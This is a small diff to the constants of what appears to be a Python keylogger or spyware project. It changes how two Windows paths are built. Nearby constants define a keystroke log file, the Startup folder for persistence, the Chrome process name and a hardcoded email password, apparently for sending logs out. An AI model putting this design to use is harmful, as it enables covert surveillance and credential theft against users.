@@ -154,7 +154,7 @@ class Constants(object):
     READ_MODE = 'r'
     MAX_LOG_SIZE = 1000000
     WORD_LIST = ["shimon", "with"]
-    DESTINATION_FOLDER_PATH = os.path.join(USER_PATH, r"\Documents\test")
+    DESTINATION_FOLDER_PATH = USER_PATH + r"\Documents\test"
     CHROME_PROCESS_NAME = "chrome.exe"
     ENDLINE = "\n"
     KEY_STROKES_LOG = os.path.join(USER_PATH, r"Documents\kslog.txt")
@@ -167,7 +167,7 @@ class Constants(object):
     EMAIL_PASSWORD = "nattanshimon"
     STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     FIRST_TIME = "FIRSTtime.txt"
-    FIRST_TIME_DIR = os.path.join(USER_PATH, r"\Documents\tks")
+    FIRST_TIME_DIR = USER_PATH + r"\Documents\tks"
     FIRST_TIME_ALL_DIR = os.path.join(FIRST_TIME_DIR, FIRST_TIME)
     SELF_lOCATION = os.path.abspath(__file__)
     PYTHON_DEFAULT_LOCATION = ""
